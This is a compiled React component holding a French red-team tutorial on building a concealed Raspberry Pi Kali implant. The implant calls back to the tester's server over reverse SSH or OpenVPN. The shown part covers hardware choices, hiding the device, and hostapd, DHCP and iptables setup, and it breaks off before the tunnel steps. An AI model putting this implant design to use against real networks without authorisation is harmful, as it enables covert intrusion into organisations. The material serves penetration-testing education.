{"ast":null,"code":"var _jsxFileName = \"C:\\\\Users\\\\Nico\\\\hackingfornoobs_frontend\\\\src\\\\components\\\\Redteam.js\";\nimport React from 'react';\nimport Hide from \"../img/hide_raspberry.jpg\";\nimport KaliRaspberry from \"../img/kali_raspberry.png\";\n\nclass Redteam extends React.Component {\n  render() {\n    return React.createElement(\"div\", {\n      className: \"article\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 9\n      },\n      __self: this\n    }, React.createElement(\"h1\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 11\n      },\n      __self: this\n    }, \"Redteam\"), React.createElement(\"hr\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 13\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 14\n      },\n      __self: this\n    }, \"Introduction\"), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 15\n      },\n      __self: this\n    }, \"Contexte\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 16\n      },\n      __self: this\n    }, \"L'objectif est de cr\\xE9er un implant qui une fois sur le r\\xE9seau d'un client se reconnecterait automatiquement \\xE0 notre serveur interne, avec \\xE0 disposition toute la boite \\xE0 outils de pentest.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 16\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 16\n      },\n      __self: this\n    }), \"Un sc\\xE9nario de Redteam serait de p\\xE9n\\xE9trer dans une soci\\xE9t\\xE9 cliente en \\xE9tant d\\xE9guis\\xE9, de placer l'implant sur le r\\xE9seau, pour obtenir \\xE0 distance un acc\\xE8s \\xE0 leur r\\xE9seau via une connexion OpenVPN ou un tunnel SSH invers\\xE9.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 18\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 18\n      },\n      __self: this\n    }), \"Des outils tels que tortle LAN existent d\\xE9j\\xE0, mais l'id\\xE9e serait d'avoir le contr\\xF4le total sur nos outils. Plusieurs m\\xE9thodes doivent \\xEAtre impl\\xE9ment\\xE9es au cas o\\xF9 le pare-feu du client bloquerait certains flux sortants. L'implant doit \\xE9galement avoir une m\\xE9thode alternative pour se connecter au cas o\\xF9 leurs r\\xE8gles de pare-feu bloquerait le traffic, une configuration sans fil pour l'appareil est donc \\xE0 envisager.\"), React.createElement(\"img\", {\n      src: KaliRaspberry,\n      style: {\n        'width': '70%'\n      },\n      alt: \"kali raspberry\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 23\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 25\n      },\n      __self: this\n    }, \"Cahier des charges de la box\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 26\n      },\n      __self: this\n    }, \"Plusieurs appareils peuvent convenir, les crit\\xE8res principaux \\xE9tant la fiabilit\\xE9, la l\\xE9g\\xE8ret\\xE9, la taille,la rapidit\\xE9 et le co\\xFBt:\", React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 28\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 29\n      },\n      __self: this\n    }, \"l'appareil doit \\xEAtre \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 29\n      },\n      __self: this\n    }, \"petit\"), \" (facile \\xE0 dissimuler)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 30\n      },\n      __self: this\n    }, \"possibilit\\xE9 d'utiliser un \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 30\n      },\n      __self: this\n    }, \"tunnel SSH inverse persistant\"), \" et/ou \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 30\n      },\n      __self: this\n    }, \"OpenVPN\"), \" pour le Command&Control\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 31\n      },\n      __self: this\n    }, \"espace de \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 31\n      },\n      __self: this\n    }, \"stockage\"), \" (au moins 32 Go)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 32\n      },\n      __self: this\n    }, \"mat\\xE9riel \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 32\n      },\n      __self: this\n    }, \"rapide\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 33\n      },\n      __self: this\n    }, React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 33\n      },\n      __self: this\n    }, \"faible co\\xFBt\"), \" (en cas de destruction ou de vol)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 34\n      },\n      __self: this\n    }, \"possibilit\\xE9 d'ajouter des modules pour la \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 34\n      },\n      __self: this\n    }, \"connexion sans fil\"))), \"Il existe de nombreux appareils comme le Hardkernel ODROID-N2, Beaglebone Black, mais pour le prix et le mat\\xE9riel, on pr\\xE9f\\xE9rera utiliser la \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 36\n      },\n      __self: this\n    }, \"Raspberry Pi 4.\")), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 38\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 40\n      },\n      __self: this\n    }, \"Shopping list pour le mat\\xE9riel\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 41\n      },\n      __self: this\n    }, React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 42\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 43\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.canakit.com/raspberry-pi-4-starter-kit.html\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 43\n      },\n      __self: this\n    }, \"Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $70\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 44\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.amazon.com/dp/B07FCMBLV6\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 44\n      },\n      __self: this\n    }, \"SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 45\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 45\n      },\n      __self: this\n    }, \"Raspberry Pi 4 Case with Fan - $12 (optional)\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 46\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 46\n      },\n      __self: this\n    }, \"Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)\")))), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 50\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 52\n      },\n      __self: this\n    }, \"Syst\\xE8me d'exploitation\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 53\n      },\n      __self: this\n    }, \"Pour le syst\\xE8me d'exploitation (OS), la distribution \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 53\n      },\n      __self: this\n    }, \"Kali Linux\"), \" sera retenue car elle poss\\xE8de d\\xE9j\\xE0 beaucoup d'outils de pentest, pas besoin d'installation et c'est facile pour tous les pentesters.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 55\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 57\n      },\n      __self: this\n    }, \"Wifi\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 58\n      },\n      __self: this\n    }, \"Le Raspberry Pi 4 dispose d\\xE9j\\xE0 d'une carte sans fil int\\xE9gr\\xE9e (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et g\\xE8re l'\", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 58\n      },\n      __self: this\n    }, \"injection de paquets\"), \" et \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 58\n      },\n      __self: this\n    }, \"le mode moniteur\"), \" (contrairement \\xE0 la Pi 3). Un autre adaptateur sans fil pourrait servir pour avoir une meilleure port\\xE9e lors d'attaques sans fil. Un adaptateur sans fil dot\\xE9 d'un chipset RT5370 pourrait \\xEAtre un bon choix, il prend en charge le mode moniteur, l'injection de paquets avec des outils comme Aireplay-ng et avait une plage d\\xE9cente. Ainsi on peut se connecter \\xE0 un adaptateur via \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 60\n      },\n      __self: this\n    }, \"hostapd \"), \"et utiliser l'autre adaptateur pour les attaques.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 62\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 64\n      },\n      __self: this\n    }, \"Comment dissimuler la Raspberry ?\"), React.createElement(\"img\", {\n      src: Hide,\n      alt: \"id\\xE9e pour chacher raspberry\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 66\n      },\n      __self: this\n    }), React.createElement(\"hr\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 68\n      },\n      __self: this\n    }), React.createElement(\"h2\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 70\n      },\n      __self: this\n    }, \"Configuration initiale\"), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 71\n      },\n      __self: this\n    }, \"Les diff\\xE9rentes \\xE9tapes:\", React.createElement(\"ol\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 72\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 73\n      },\n      __self: this\n    }, \"Configurer l'image Kali pour la carte MicroSD\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 74\n      },\n      __self: this\n    }, \"Configurer un point d'acc\\xE8s WiFi avec hostapd\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 75\n      },\n      __self: this\n    }, \"Configurer un tunnel SSH inverse automatique\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 76\n      },\n      __self: this\n    }, \"Configurer le client et le serveur OpenVPN\"))), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 79\n      },\n      __self: this\n    }, \"Installation de Kali Linux\"), React.createElement(\"a\", {\n      href: \"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 80\n      },\n      __self: this\n    }, \"Kali Linux\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 82\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 83\n      },\n      __self: this\n    }), React.createElement(\"div\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 85\n      },\n      __self: this\n    }, React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 86\n      },\n      __self: this\n    }, \"Pour Windows\"), \"Avec un adaptateur microSD vers USB et connectez la carte microSD \\xE0 votre syst\\xE8me Windows.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 87\n      },\n      __self: this\n    }), \"D\\xE9compressez l'archive.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 88\n      },\n      __self: this\n    }), \"Utilisez Win32DiskImager pour \\xE9crire l'image Kali sur la carte microSD.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 89\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 91\n      },\n      __self: this\n    }), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 93\n      },\n      __self: this\n    }, \"Pour Linux\"), \"Avec un adaptateur MicroSD vers USB et connectez la carte microSD au syst\\xE8me Linux.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 94\n      },\n      __self: this\n    }), \"Utilisez la commande \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 95\n      },\n      __self: this\n    }, \"dd\"), \" pour cr\\xE9er une image du fichier Kali sur la carte microSD.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 95\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 97\n      },\n      __self: this\n    }), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 99\n      },\n      __self: this\n    }, \"Installation\"), \"Connectez-vous \\xE0 Kali Linux avec le nom d'utilisateur \\\"root\\\" et le mot de passe \\\"toor\\\".\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 100\n      },\n      __self: this\n    }), \"Veillez \\xE0 connecter un c\\xE2ble Ethernet sur la Raspberry Pi 4 pour l'acc\\xE8s internet, elle devrait automatiquement r\\xE9cup\\xE9rer une adresse IP via DHCP.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 105\n      },\n      __self: this\n    }), React.createElement(\"h4\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 107\n      },\n      __self: this\n    }, \"Configurer un point d'acc\\xE8s wifi avec hostpad\"), React.createElement(\"div\", {\n      id: \"wifi\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 108\n      },\n      __self: this\n    }, \"apt-get install hostapd \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 108\n      },\n      __self: this\n    }), \"apt-get install pciutils\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 109\n      },\n      __self: this\n    }), \"nano /etc/network/interfaces\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 111\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 111\n      },\n      __self: this\n    }), \"##The /etc/network/interfaces file should look like the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 112\n      },\n      __self: this\n    }), \"auto lo\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 114\n      },\n      __self: this\n    }), \"iface lo inet loopback\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 115\n      },\n      __self: this\n    }), \"auto eth0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 116\n      },\n      __self: this\n    }), \"iface eth0 inet dhcp\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 117\n      },\n      __self: this\n    }), \"auto wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 118\n      },\n      __self: this\n    }), \"allow-hotplug wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 119\n      },\n      __self: this\n    }), \"iface wlan0 inet static\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 120\n      },\n      __self: this\n    }), \"address 172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 121\n      },\n      __self: this\n    }), \"netmask 255.255.255.0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 122\n      },\n      __self: this\n    }), \"gateway 172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 123\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 125\n      },\n      __self: this\n    }), \"##Install a DHCP server that will serve WiFi clients:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 127\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 127\n      },\n      __self: this\n    }), \"apt-get install udhcpd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 129\n      },\n      __self: this\n    }), \"nano /etc/udhcpd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 131\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 131\n      },\n      __self: this\n    }), \"##Add the following to the end of the file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 132\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 132\n      },\n      __self: this\n    }), \"start           172.16.66.50\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 134\n      },\n      __self: this\n    }), \"end             172.16.66.70\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 135\n      },\n      __self: this\n    }), \"interface       wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 136\n      },\n      __self: this\n    }), \"# Optional\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 137\n      },\n      __self: this\n    }), \"opt     dns     1.1.1.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 138\n      },\n      __self: this\n    }), \"option  subnet  255.255.255.0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 139\n      },\n      __self: this\n    }), \"opt     router  172.16.66.1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 140\n      },\n      __self: this\n    }), \"option  domain  local\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 141\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 142\n      },\n      __self: this\n    }), \"##Create a file for udhcpd.leases:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 143\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 143\n      },\n      __self: this\n    }), \"touch /var/lib/misc/udhcpd.leases\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 145\n      },\n      __self: this\n    }), \"##Edit the /etc/default/udhcpd file \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 146\n      },\n      __self: this\n    }), \"and change the DHCPD_ENABLED=\\u201Dno\\u201D to \\u201Cyes\\u201D:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 146\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 146\n      },\n      __self: this\n    }), \"DHCPD_ENABLED=\\u201Dyes\\u201D\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 148\n      },\n      __self: this\n    }), \"##Create the file /etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 149\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 149\n      },\n      __self: this\n    }), \"nano /etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 151\n      },\n      __self: this\n    }), \"##Copy the following into the hostapd.conf file :\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 152\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 152\n      },\n      __self: this\n    }), \"# Interface configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 154\n      },\n      __self: this\n    }), \"interface=wlan0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 155\n      },\n      __self: this\n    }), \"ssid=iphone10\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 156\n      },\n      __self: this\n    }), \"channel=6\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 157\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 157\n      },\n      __self: this\n    }), \"# WPA Configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 159\n      },\n      __self: this\n    }), \"macaddr_acl=0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 160\n      },\n      __self: this\n    }), \"auth_algs=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 161\n      },\n      __self: this\n    }), \"ignore_broadcast_ssid=0\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 162\n      },\n      __self: this\n    }), \"wpa=2\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 163\n      },\n      __self: this\n    }), \"wpa_passphrase=SuperSecretSquirrel\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 164\n      },\n      __self: this\n    }), \"wpa_key_mgmt=WPA-PSK\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 165\n      },\n      __self: this\n    }), \"rsn_pairwise=CCMP\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 166\n      },\n      __self: this\n    }), \"#Hardware Configuration\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 168\n      },\n      __self: this\n    }), \"driver=nl80211\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 169\n      },\n      __self: this\n    }), \"ieee80211n=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 170\n      },\n      __self: this\n    }), \"hw_mode=g\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 171\n      },\n      __self: this\n    }), \"wmm_enabled=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 172\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 172\n      },\n      __self: this\n    }), \"nano /etc/init.d/hostapd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 175\n      },\n      __self: this\n    }), \"##Change the line to the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 176\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 176\n      },\n      __self: this\n    }), \"DAEMON_CONF=/etc/hostapd/hostapd.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 178\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 178\n      },\n      __self: this\n    }), \"nano /etc/default/hostapd\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 180\n      },\n      __self: this\n    }), \"##Change the line to the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 181\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 181\n      },\n      __self: this\n    }), \"DAEMON_CONF=\\\"/etc/hostapd/hostapd.conf\\\" update-rc.d hostapd enable ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 186\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 186\n      },\n      __self: this\n    }), \"sysctl -w net.ipv4.ip_forward=1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 188\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 188\n      },\n      __self: this\n    }), \"nano /etc/sysctl.conf\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 190\n      },\n      __self: this\n    }), \"[Remove the \\u201C#\\u201D in front of net.ipv4.ip_forward=1]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 191\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 191\n      },\n      __self: this\n    }), \"Finally, use your IPTables-magic to masquerade client connections to the Internet:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 193\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 193\n      },\n      __self: this\n    }), \"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 195\n      },\n      __self: this\n    }), \"There is a package available in Kali to make these changes to IPTables last.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 196\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 196\n      },\n      __self: this\n    }), \"apt-get install iptables-persistent\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 198\n      },\n      __self: this\n    }), \"iptables-save > /etc/iptables/rules.v4\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 199\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 199\n      },\n      __self: this\n    }), \"##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 200\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 200\n      },\n      __self: this\n    }), \"nano /etc/network/if-pre-up.d/iptables\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 202\n      },\n      __self: this\n    }), \"Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 203\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 203\n      },\n      __self: this\n    }), \"#!/bin/bash\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 205\n      },\n      __self: this\n    }), \"/usr/sbin/iptables-restore \", '<', \" /etc/iptables/rules.v4\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 206\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 206\n      },\n      __self: this\n    }), \"chmod +x /etc/network/if-pre-up.d/iptables\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 208\n      },\n      __self: this\n    }), \"reboot\", React.createElement(\"br\", 